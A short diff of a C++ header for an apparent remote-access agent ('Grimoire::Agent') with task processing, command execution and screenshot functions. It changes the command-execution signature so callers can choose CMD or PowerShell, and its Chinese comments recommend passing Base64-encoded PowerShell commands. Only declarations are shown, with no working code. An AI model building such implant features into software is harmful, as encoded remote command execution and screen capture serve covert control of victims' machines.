@@ -50,11 +50,11 @@ namespace Grimoire::Agent {
         std::vector<unsigned char> ProcessTask(const std::vector<unsigned char>& task_payload);
 
         /**
-         * @brief 执行命令任务。
-         * @param command 要执行的命令字符串。
-         * @return 命令执行结果的字符串。
+         * @brief 执行系统指令（支持 CMD 和 PowerShell Base64）
+         * @param command 如果是 powershell，这里建议传入 Base64 编码后的指令字符串
+         * @param shellType "cmd" 或 "powershell"
          */
-        std::string ExecuteCommand(const std::string& command);
+        std::string ExecuteCommand(const std::string& command, const std::string& shellType);
 
         /**
          * @brief 截屏任务。
